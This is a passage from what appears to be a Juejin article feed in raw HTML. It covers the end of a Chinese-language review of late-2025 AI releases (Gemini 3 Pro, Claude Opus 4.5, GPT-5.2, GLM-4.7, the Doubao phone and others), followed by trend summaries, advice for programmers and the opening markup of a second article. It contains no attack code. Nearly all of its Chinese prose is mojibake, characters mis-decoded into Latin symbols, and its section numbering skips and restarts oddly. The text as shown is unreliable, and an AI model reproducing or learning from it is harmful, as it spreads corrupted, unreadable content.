<li>æä¾›8ç§å¯å®šåˆ¶ä¸ªæ€§é€‰é¡¹ï¼ˆOpenAIè¿„ä»Šæœ€å¯å®šåˆ¶çš„æ¨¡å‹ï¼‰</li>
<li>åœ¨æŒ‡ä»¤éµå¾ªå’Œå“åº”é£æ ¼ä¸Šå®ç°çªç ´</li>
<li>æ•°å­¦æ¨ç†å’Œä»£ç ç”Ÿæˆèƒ½åŠ›å‡ºè‰²</li>
<li>æ¨ç†é€Ÿåº¦å’Œç”¨æˆ·ä½“éªŒæå‡</li>
</ul>
<hr/>
<h3 data-id="heading-27">11æœˆ19æ—¥ - Gemini 3 Pro å‘å¸ƒï¼ˆè°·æ­Œçš„ç‹ç‰Œï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>åœ¨æ ¸å¿ƒåŸºå‡†æµ‹è¯•ä¸­è¡¨ç°ä¼˜äºGPT-5.1å’ŒClaude Sonnet 4.5</strong></li>
<li>æ¨ç†ã€å¤šæ¨¡æ€ã€ä»£ç†å·¥å…·ä½¿ç”¨ã€å¤šè¯­è¨€æ€§èƒ½ã€é•¿ä¸Šä¸‹æ–‡ç­‰å…¨é¢é¢†å…ˆ</li>
<li>æ”¯æŒè¶…é•¿ä¸Šä¸‹æ–‡çª—å£</li>
<li>å¼•å‘OpenAIçš„"çº¢è‰²è­¦æˆ’"</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>å¤šè¯­è¨€ç¼–ç¨‹èƒ½åŠ›å¼ºå¤§</li>
<li>å¤šæ¨¡æ€èƒ½åŠ›ï¼Œå¯åŒæ—¶å¤„ç†ä»£ç ã€å›¾è¡¨ã€UIè®¾è®¡</li>
<li>å¼•å‘æ–°ä¸€è½®AIå†›å¤‡ç«èµ›</li>
</ul>
<hr/>
<h3 data-id="heading-28">11æœˆ20æ—¥ - Nano Banana Pro å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>åŸºäºGemini 3 Proçš„å›¾åƒç”Ÿæˆæ¨¡å‹</li>
<li>å›¾åƒç”Ÿæˆé¢†åŸŸè¡¨ç°å‡ºè‰²</li>
<li>ä¸€ä½“åŒ–å†…å®¹ç”Ÿäº§åŠ›å·¥å…·</li>
<li>ä»æ–‡æœ¬åˆ°å›¾åƒçš„æ— ç¼è¡”æ¥</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>ä»æ–‡æœ¬æè¿°ç›´æ¥ç”Ÿæˆé«˜è´¨é‡ç•Œé¢åŸå‹</li>
<li>åŠ é€Ÿå‰ç«¯å¼€å‘æµç¨‹</li>
<li>ä¸Gemini 3 Proå½¢æˆå®Œæ•´çš„å¤šæ¨¡æ€ç”Ÿæ€</li>
</ul>
<hr/>
<h3 data-id="heading-29">11æœˆ21æ—¥ - NotebookLM é‡å¤§æ›´æ–°</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>é›†æˆ Gemini 3 Pro å’Œ Nano Banana Pro</li>
<li><strong>ä¸€é”®ç”Ÿæˆä¸“ä¸šPPTåŠŸèƒ½</strong>ï¼šå¼•å…¥Slide DecksåŠŸèƒ½ï¼Œæ”¯æŒä¸€é”®ç”Ÿæˆä¸“ä¸šçº§åˆ«çš„æ¼”ç¤ºæ–‡ç¨¿</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>å¤§å¹…æå‡æ¼”ç¤ºæ–‡ç¨¿åˆ¶ä½œæ•ˆç‡</strong>ï¼šå‡å°‘æ‰‹åŠ¨ç¼–è¾‘æ—¶é—´ï¼ŒèŠ‚çœæ—¶é—´å’Œç²¾åŠ›</li>
<li><strong>é™ä½ä¸“ä¸šPPTåˆ¶ä½œé—¨æ§›</strong>ï¼šä½¿æ›´å¤šç”¨æˆ·èƒ½å¤Ÿè½»æ¾åˆ›å»ºé«˜è´¨é‡çš„æ¼”ç¤ºæ–‡ç¨¿</li>
<li>ç»“åˆGemini 3 Proçš„å¼ºå¤§ç†è§£èƒ½åŠ›ï¼Œæå‡å†…å®¹è´¨é‡</li>
</ul>
<hr/>
<h3 data-id="heading-30">11æœˆ25æ—¥ - Claude Opus 4.5 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>ä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–ç æ¨¡å‹</strong></li>
<li><strong>æ”¯æŒè¶…é•¿ä¸Šä¸‹æ–‡</strong>ï¼šé€‚åˆå¤§å‹ä»£ç åº“åˆ†æ</li>
<li><strong>Opusçº§åˆ«çš„æ·±åº¦æ¨ç†èƒ½åŠ›</strong>ï¼šåœ¨å¤æ‚æ¶æ„è®¾è®¡ä¸Šè¶…è¶ŠSonnet</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>ç»§ç»­å·©å›ºClaude Code"æœ€å¼ºç¼–ç¨‹åŠ©æ‰‹"åœ°ä½</strong></li>
<li><strong>é€‚åˆå¤æ‚ç³»ç»Ÿçš„æ¶æ„è®¾è®¡å’Œä¼˜åŒ–</strong>ï¼šä¸ä»…èƒ½å†™ä»£ç ï¼Œæ›´èƒ½åšæŠ€æœ¯å†³ç­–</li>
<li><strong>æ·±åº¦æ¨ç†èƒ½åŠ›</strong>ï¼šåœ¨ç³»ç»Ÿè®¾è®¡ã€æ€§èƒ½ä¼˜åŒ–ç­‰éœ€è¦æ·±åº¦æ€è€ƒçš„åœºæ™¯ä¸­è¡¨ç°å“è¶Š</li>
</ul>
<hr/>
<h3 data-id="heading-31">12æœˆ1æ—¥ - DeepSeek V3.2 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ€§èƒ½ç¨³å®šæ€§æå‡</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æŒç»­è¿­ä»£å±•ç°æŠ€æœ¯å®åŠ›</li>
</ul>
<hr/>
<h3 data-id="heading-32">12æœˆ1æ—¥ - è±†åŒ…æ‰‹æœºå‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: å­—èŠ‚è·³åŠ¨ Ã— ä¸­å…´é€šè®¯</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>é›†æˆè±†åŒ…AIåŠ©æ‰‹</li>
<li>æ™ºèƒ½æ¨èã€è¯­éŸ³åŠ©æ‰‹ã€å›¾åƒè¯†åˆ«</li>
<li>AIåŠŸèƒ½æ·±åº¦é›†æˆåˆ°ç³»ç»Ÿå±‚</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>ç§»åŠ¨ç«¯AIåŠ©æ‰‹çš„å¤§èƒ†å°è¯•ï¼Œé¦–ä¸ªAIæ·±åº¦é›†æˆåˆ°ç§»åŠ¨OSçš„æ¢ç´¢æ¡ˆä¾‹</li>
<li>å‘å¸ƒåç«‹å³è¢«å¾®ä¿¡ã€æ”¯ä»˜å®ç­‰ä¸»æµåº”ç”¨ç¦ç”¨ï¼Œç”¨æˆ·ä½“éªŒä¸¥é‡å—é™</li>
<li>å¼•å‘å…³äºAIæ‰‹æœºç”Ÿæ€çš„å¹¿æ³›è®¨è®ºï¼Œæ­ç¤ºäº†å¹³å°å„æ–­ä¸AIåˆ›æ–°çš„æ ¹æœ¬å†²çª</li>
<li>æ™ºè°±AIéšåå¼€æºäº†AutoGLMé¡¹ç›®</li>
</ul>
<hr/>
<h3 data-id="heading-33">12æœˆ9æ—¥ - GPT-5.2 å‘å¸ƒï¼ˆå¥¥ç‰¹æ›¼çš„"çº¢è‰²è­¦æˆ’"ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: OpenAI</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ•´åˆGPTç³»åˆ—å’Œoç³»åˆ—èƒ½åŠ›</li>
<li>å…·å¤‡è°ƒåº¦å­æ¨¡å‹èƒ½åŠ›</li>
<li><strong>æå‰å‘å¸ƒä»¥åº”å¯¹Gemini 3 Proçš„ç«äº‰å‹åŠ›</strong></li>
<li>ç¼–ç¨‹èƒ½åŠ›ã€åˆ›æ„å†™ä½œã€å¥åº·é¢†åŸŸæ˜¾è‘—æå‡</li>
<li>é€»è¾‘æ¨ç†å’Œé•¿ä¸Šä¸‹æ–‡è®°å¿†èƒ½åŠ›æå‡</li>
<li>æ¨ç†é€Ÿåº¦ã€å¤šæ¨¡æ€æ•ˆç‡å’Œä¸Šä¸‹æ–‡é•¿åº¦å…¨é¢æå‡</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>Sam Altmançš„"çº¢è‰²è­¦æˆ’"ï¼šGemini 3 Proçš„å¼ºåŠ²è¡¨ç°è®©OpenAIæ„Ÿå—åˆ°å‹åŠ›</li>
<li>ç»Ÿä¸€å¤§è¯­è¨€æ¨¡å‹å’Œæ¨ç†æ¨¡å‹ï¼Œä¸€ç«™å¼è§£å†³æ–¹æ¡ˆ</li>
<li>ç¼–ç¨‹èƒ½åŠ›å…¨é¢æå‡ï¼Œå¯¹æŠ—Gemini 3 Pro</li>
<li>è°ƒç”¨æˆæœ¬è¾ƒé«˜</li>
</ul>
<hr/>
<h3 data-id="heading-34">12æœˆ18æ—¥ - Agent Skills å¼€æ”¾æ ‡å‡†å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å°†Agent Skillså‘å¸ƒä¸ºå¼€æ”¾æ ‡å‡†</li>
<li>æ—¨åœ¨æ„å»ºAIå¼€æ”¾ç”Ÿæ€</li>
<li>å¤šå®¶å¤´éƒ¨å·¥å…·å®£å¸ƒæ”¯æŒ</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ¨åŠ¨AIæŠ€èƒ½ç”Ÿæ€çš„å¼€æ”¾å’Œæ ‡å‡†åŒ–</li>
<li>ä¸€æ¬¡å¼€å‘ï¼Œå¤šå¹³å°ä½¿ç”¨</li>
</ul>
<hr/>
<h3 data-id="heading-35">12æœˆ20æ—¥ - Kiro å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: äºšé©¬é€Šäº‘ç§‘æŠ€ï¼ˆAWSï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>AIç¼–ç¨‹å·¥å…·</li>
<li>æ”¯æŒ <strong>Spec Coding</strong>ï¼šè§„èŒƒåŒ–ç¼–ç ï¼Œå¼ºè°ƒè´¨é‡å’Œæ ‡å‡†</li>
<li>å¯è¿ç»­è‡ªä¸»ç¼–ç¨‹æ•°æ—¥</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>Vibe Codingé€‚åˆå¿«é€ŸéªŒè¯æƒ³æ³•</li>
<li>Spec Codingé€‚åˆç”Ÿäº§ç¯å¢ƒçš„ä¸¥è°¨å¼€å‘</li>
<li>å±•ç¤ºäº†AIè‡ªä¸»ç¼–ç¨‹çš„æ½œåŠ›</li>
</ul>
<hr/>
<h3 data-id="heading-36">12æœˆ23æ—¥ - GLM-4.7 å‘å¸ƒï¼ˆå›½äº§å¼€æºæœŸé—´æ–°é«˜åº¦ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ™ºè°±AI</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>æ–°ä¸€ä»£æ——èˆ°å¼€æºç¼–ç å¤§æ¨¡å‹</strong>ï¼Œ<strong>ä½åˆ—å¼€æºæ¨¡å‹ä¸å›½äº§æ¨¡å‹åŒæ¦œé¦–</strong></li>
<li>å·¥å…·è°ƒç”¨å’Œå¤æ‚æ¨ç†èƒ½åŠ›å¢å¼º</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>å›½äº§å¼€æºç¼–ç æ¨¡å‹è¾¾åˆ°æ–°é«˜åº¦</strong>ï¼Œæ ‡å¿—æ€§çªç ´</li>
<li>é•¿ä¸Šä¸‹æ–‡æ”¯æŒï¼Œé€‚åˆå¤§å‹é¡¹ç›®å’Œå¤æ‚ä»£ç åº“</li>
<li>æä½æˆæœ¬ï¼Œä¸ºä¼ä¸šAIç¼–ç æä¾›é«˜æ€§ä»·æ¯”é€‰æ‹©</li>
</ul>
<hr/>
<h3 data-id="heading-37">12æœˆ27æ—¥ - Andrej Karpathyå¦è¨€"æˆ‘ä»æœªå¦‚æ­¤è½å"</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Andrej Karpathyï¼ˆå‰OpenAIåˆ›å§‹æˆå‘˜ã€ç‰¹æ–¯æ‹‰AIæ€»ç›‘ï¼‰</p>
<p><strong>æ ¸å¿ƒè¨€è®º</strong>:</p>
<ul>
<li><strong>"ä½œä¸ºç¨‹åºå‘˜ï¼Œæˆ‘ä»æœªæ„Ÿåˆ°å¦‚æ­¤è½å"</strong></li>
<li>ç¼–ç¨‹èŒä¸šæ­£åœ¨è¢«å½»åº•é‡æ„ï¼šç¨‹åºå‘˜è´¡çŒ®çš„ä»£ç è¶Šæ¥è¶Šå°‘ï¼Œæ›´å¤šçš„æ˜¯åœ¨å„ç§å·¥å…·ä¹‹é—´è¿›è¡Œä¸²è”</li>
<li><strong>èƒ½åŠ›å·®è·å·¨å¤§</strong>ï¼šå¦‚æœèƒ½æ­£ç¡®åˆ©ç”¨è¿‡å»ä¸€å¹´å‡ºç°çš„æ–°å·¥å…·ï¼Œä¸ªäººèƒ½åŠ›æœ¬å¯ä»¥æå‡10å€</li>
<li>å¦åˆ™å°†é¢ä¸´æŠ€èƒ½ç„¦è™‘å’Œè¢«æ·˜æ±°çš„é£é™©</li>
</ul>
<p><strong>èƒŒæ™¯ä»‹ç»</strong>:</p>
<ul>
<li><strong>Vibe Coding æ¦‚å¿µæå‡ºè€…</strong>ï¼š2025å¹´2æœˆæå‡ºé€šè¿‡è‡ªç„¶è¯­è¨€æç¤ºå¼•å¯¼AIç”Ÿæˆä»£ç çš„ç†å¿µ</li>
<li><strong>å‰OpenAIåˆ›å§‹æˆå‘˜</strong>ï¼šæ·±åº¦å‚ä¸GPTç³»åˆ—æ¨¡å‹å¼€å‘</li>
<li><strong>ç‰¹æ–¯æ‹‰AIæ€»ç›‘</strong>ï¼šè´Ÿè´£Autopilotè§†è§‰ç³»ç»Ÿ</li>
<li><strong>AIæ•™è‚²é¢†åŸŸæƒå¨</strong>ï¼šæ–¯å¦ç¦å¤§å­¦CS231nè¯¾ç¨‹åˆ›å§‹äººï¼ŒYouTube AIè¯¾ç¨‹è§‚çœ‹é‡è¶…ç™¾ä¸‡</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>å¼•å‘å…¨çƒç¨‹åºå‘˜å…±é¸£</strong>ï¼šå³ä½¿æ˜¯AIé¢†åŸŸé¡¶å°–ä¸“å®¶ä¹Ÿæ„Ÿåˆ°æŠ€æœ¯æ›´æ–°å‹åŠ›</li>
<li><strong>éªŒè¯AIå·¥å…·è¿­ä»£é€Ÿåº¦</strong>ï¼š2025å¹´AIå·¥å…·æ›´æ–°é€Ÿåº¦è¶…å‡ºæ‰€æœ‰äººé¢„æœŸ</li>
<li><strong>æŠ€èƒ½ç„¦è™‘æ™®éåŒ–</strong>ï¼šä»åˆçº§å¼€å‘è€…åˆ°è¡Œä¸šæƒå¨ï¼Œæ‰€æœ‰äººéƒ½é¢ä¸´é€‚åº”æŒ‘æˆ˜</li>
<li><strong>æˆä¸º2025å¹´AIè®¨è®ºçš„æ ‡å¿—æ€§æ—¶åˆ»</strong>ï¼šçœŸå®åæ˜ äº†AIå¯¹ç¼–ç¨‹è¡Œä¸šçš„æ·±åˆ»å†²å‡»</li>
</ul>
<hr/>
<h2 data-id="heading-38">ğŸŒŸ 2025å¹´AIå‘å±•è¶‹åŠ¿æ€»ç»“</h2>
<h3 data-id="heading-39">1. <strong>æ¨ç†æ¨¡å‹é©å‘½</strong></h3>
<ul>
<li>DeepSeek R1å¼€å¯"æ¨ç†æ¨¡å‹å…ƒå¹´"</li>
<li>"æ…¢æ€è€ƒ"ç­–ç•¥è¢«è¯æ˜æœ‰æ•ˆï¼šç»™AIæ›´å¤šæ—¶é—´æ¨ç†èƒ½è·å¾—æ›´å¥½ç»“æœ</li>
<li>æ¨ç†èƒ½åŠ›æˆä¸ºAIæ¨¡å‹çš„æ ¸å¿ƒç«äº‰åŠ›</li>
<li>o1ã€R1ç­‰æ¨ç†æ¨¡å‹æ”¹å˜AIåº”ç”¨èŒƒå¼</li>
</ul>
<h3 data-id="heading-40">2. <strong>AI Agentæ—¶ä»£åˆ°æ¥</strong></h3>
<ul>
<li>Manuså±•ç¤ºäº†é€šç”¨AI Agentçš„å¯èƒ½æ€§</li>
<li>Dify é™ä½AIåº”ç”¨å¼€å‘é—¨æ§›</li>
<li>MCPåè®®ç»Ÿä¸€Agentä¸å·¥å…·é€šä¿¡</li>
<li>Agent Skillså¼€æ”¾æ ‡å‡†æ¨åŠ¨ç”Ÿæ€ç¹è£</li>
</ul>
<h3 data-id="heading-41">3. <strong>AIç¼–ç¨‹å·¥å…·ä»"è¾…åŠ©"åˆ°"åä½œ"</strong></h3>
<ul>
<li>ä»ç®€å•çš„ä»£ç è¡¥å…¨è¿›åŒ–åˆ°å¤æ‚ä»»åŠ¡çš„è‡ªä¸»å®Œæˆ</li>
<li>Cursorã€Claude Codeã€Kiroç­‰å·¥å…·å¼•é¢†"AIç»“å¯¹ç¼–ç¨‹"æ–°èŒƒå¼</li>
<li>AIèƒ½å¤Ÿè¿ç»­å·¥ä½œå¤„ç†å¤§å‹é‡æ„ä»»åŠ¡</li>
<li>Vibe Coding vs Spec Codingï¼šä¸åŒåœºæ™¯é€‰æ‹©ä¸åŒç­–ç•¥</li>
</ul>
<h3 data-id="heading-42">5. <strong>å›½äº§å¤§æ¨¡å‹å´›èµ·ä¸"DeepSeekéœ‡æ’¼"</strong></h3>
<ul>
<li>DeepSeekç³»åˆ—åœ¨ä»£ç èƒ½åŠ›ä¸Šå…¨é¢è¿½å¹³å›½é™…é¡¶å°–æ¨¡å‹ã€</li>
<li><strong>DeepSeek R1ä»¥ä½æˆæœ¬é«˜æ€§èƒ½é‡å¡‘AIè¡Œä¸šè®¤çŸ¥</strong></li>
<li>ä¸­å›½ç¨‹åºå‘˜æ‹¥æœ‰æ›´å¤šæœ¬åœŸåŒ–é€‰æ‹©</li>
<li>æ‰“ç ´"é«˜ç®—åŠ›å„æ–­"ï¼Œè¯æ˜æŠ€æœ¯åˆ›æ–°çš„åŠ›é‡</li>
</ul>
<h3 data-id="heading-43">6. <strong>AIå·¨å¤´å†›å¤‡ç«èµ›ç™½çƒ­åŒ–</strong></h3>
<ul>
<li>OpenAI vs Googleï¼šGPT-5.2æå‰å‘å¸ƒåº”å¯¹Gemini 3 Pro</li>
<li>Anthropicã€DeepSeekç­‰å¤šæ–¹åŠ¿åŠ›å´›èµ·</li>
<li>æ¯æœˆéƒ½æœ‰é‡ç£…æ¨¡å‹å‘å¸ƒï¼ŒæŠ€æœ¯è¿­ä»£åŠ é€Ÿ</li>
<li>ç¼–ç èƒ½åŠ›æˆä¸ºå„å®¶PKçš„ä¸»æˆ˜åœº</li>
</ul>
<h3 data-id="heading-44">9. <strong>AIç”Ÿæ€å†²çªä¸é‡æ„</strong></h3>
<ul>
<li>è±†åŒ…æ‰‹æœºè¢«å¾®ä¿¡ã€æ”¯ä»˜å®ç¦ç”¨äº‹ä»¶</li>
<li>AIç¡¬ä»¶ä¸ä¼ ç»Ÿè½¯ä»¶ç”Ÿæ€çš„çŸ›ç›¾</li>
<li>å¹³å°å„æ–­ä¸AIåˆ›æ–°çš„å†²çªå‡¸æ˜¾</li>
</ul>
<hr/>
<h2 data-id="heading-45">ğŸ’¡ å¯¹ç¨‹åºå‘˜çš„å»ºè®®</h2>
<ol start="0">
<li><strong>æŒæ¡æ¨ç†æ¨¡å‹çš„ä½¿ç”¨</strong>ï¼šäº†è§£æ¨¡å‹ä½¿ç”¨çš„è¾¹ç•Œï¼Œæ¯”å¦‚ç†è§£ä½•æ—¶éœ€è¦æ¨ç†ï¼Œä½•æ—¶éœ€è¦å¿«é€Ÿå“åº”</li>
<li><strong>å­¦ä¹ AI Agentå¼€å‘</strong>ï¼šMCPã€Agent Skillsç­‰æˆä¸ºé‡è¦æŠ€èƒ½</li>
<li><strong>æå‡æç¤ºè¯å·¥ç¨‹èƒ½åŠ›</strong>ï¼šå¦‚ä½•ç²¾å‡†æè¿°éœ€æ±‚æˆä¸ºæ ¸å¿ƒæŠ€èƒ½</li>
<li><strong>å…³æ³¨ä¼ä¸šçº§åº”ç”¨</strong>ï¼šæœ¬åœ°éƒ¨ç½²ã€æŠ€èƒ½å®šåˆ¶ç­‰ä¼ä¸šéœ€æ±‚</li>
<li><strong>ä¿æŒæ¶æ„æ€ç»´</strong>ï¼šæœ‰è¯†åˆ«æ¶æ„è®¾è®¡æ–¹æ¡ˆä¼˜åŠ£çš„èƒ½åŠ›</li>
<li><strong>åŸ¹å…»ä»£ç reviewèƒ½åŠ›</strong>ï¼šéªŒè¯AIç”Ÿæˆä»£ç çš„æ­£ç¡®æ€§ã€å®‰å…¨æ€§å’Œæ€§èƒ½</li>
<li><strong>å­¦ä¹ å¤šå·¥å…·ç»„åˆ</strong>ï¼šä¸åŒä»»åŠ¡é€‰æ‹©æœ€é€‚åˆçš„AIå·¥å…·</li>
<li><strong>å…³æ³¨æˆæœ¬ä¼˜åŒ–</strong>ï¼šå¼€æºæ¨¡å‹æä¾›é«˜æ€§ä»·æ¯”é€‰æ‹©</li>
<li><strong>æŒç»­å­¦ä¹ </strong>ï¼šAIå‘å±•æ—¥æ–°æœˆå¼‚ï¼Œæ¯æœˆéƒ½æœ‰é‡ç£…æ›´æ–°</li>
<li><strong>æ¢ç´¢å¤šæ¨¡æ€åº”ç”¨</strong>ï¼šè§†é¢‘ã€éŸ³ä¹ã€å›¾åƒç”Ÿæˆä¸ºåº”ç”¨å¼€å‘å¸¦æ¥æ–°å¯èƒ½</li>
</ol>
<hr/>
<h2 data-id="heading-46">ğŸ’¬ ç»“è¯­</h2>
<p>2025å¹´ï¼ŒAIä¸ä»…æ”¹å˜äº†æˆ‘ä»¬å†™ä»£ç çš„æ–¹å¼ï¼Œæ›´é‡å¡‘äº†æ•´ä¸ªè¡Œä¸šçš„æ ¼å±€å’Œå•†ä¸šæ¨¡å¼ã€‚ä»"å¿«é€Ÿç”Ÿæˆ"åˆ°"æ·±åº¦æ¨ç†"ï¼Œä»"å•ä¸€æ¨¡å‹"åˆ°"Agentåä½œ"ï¼Œä»"é«˜æ˜‚æˆæœ¬"åˆ°"å¹³æ°‘ä»·æ ¼"ï¼ŒAIæŠ€æœ¯çš„å‘å±•å’Œå•†ä¸šåŒ–éƒ½è¶…å‡ºäº†æ‰€æœ‰äººçš„é¢„æœŸã€‚</p>
<p>ä½œä¸ºç¨‹åºå‘˜ï¼Œæˆ‘ä»¬æ—¢æ˜¯è§è¯è€…ï¼Œä¹Ÿæ˜¯å‚ä¸è€…ã€‚<strong>æœªæ¥å±äºé‚£äº›èƒ½å¤Ÿé©¾é©­AIçš„äººã€‚</strong></p>
<p>åœ¨è¿™ä¸ªAIç¼–ç¨‹å·¥å…·ç™¾èŠ±é½æ”¾çš„æ—¶ä»£ï¼Œé€‰æ‹©é€‚åˆè‡ªå·±çš„å·¥å…·ã€ç†è§£æ¨ç†æ¨¡å‹çš„ä»·å€¼ã€æŒæ¡Agentå¼€å‘æŠ€èƒ½ã€å‚ä¸å¼€æ”¾æ ‡å‡†ï¼Œè¿™äº›å°†æˆä¸ºç¨‹åºå‘˜çš„æ ¸å¿ƒç«äº‰åŠ›ã€‚</p>
<p>2025å¹´å·²ç»å¦‚æ­¤ç²¾å½©ï¼Œ2026å¹´åˆä¼šç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆæƒŠå–œï¼Ÿè®©æˆ‘ä»¬æ‹­ç›®ä»¥å¾…ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´ç»ˆå›é¡¾ï¼š25 å²ï¼Œä»â€œæ··åƒç­‰æ­»â€åˆ°åˆ«äººçœ¼ä¸­çš„â€œæŠ€æœ¯ä¸“å®¶â€]]></title>    <link>https://juejin.cn/post/7592789801708896297</link>    <guid>https://juejin.cn/post/7592789801708896297</guid>    <pubDate>2026-01-08T09:33:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708896297" data-draft-id="7592555965793222662" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´ç»ˆå›é¡¾ï¼š25 å²ï¼Œä»â€œæ··åƒç­‰æ­»â€åˆ°åˆ«äººçœ¼ä¸­çš„â€œæŠ€æœ¯ä¸“å®¶â€"/> <meta itemprop="keywords" content="å‰ç«¯,å¹´ç»ˆæ€»ç»“,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-08T09:33:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä½•è´¤"/> <meta itemprop="url" content="https://juejin.cn/user/277499952247869"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´ç»ˆå›é¡¾ï¼š25 å²ï¼Œä»â€œæ··åƒç­‰æ­»â€åˆ°åˆ«äººçœ¼ä¸­çš„â€œæŠ€æœ¯ä¸“å®¶â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/277499952247869/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä½•è´¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:33:53.000Z" title="Thu Jan 08 2026 09:33:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body 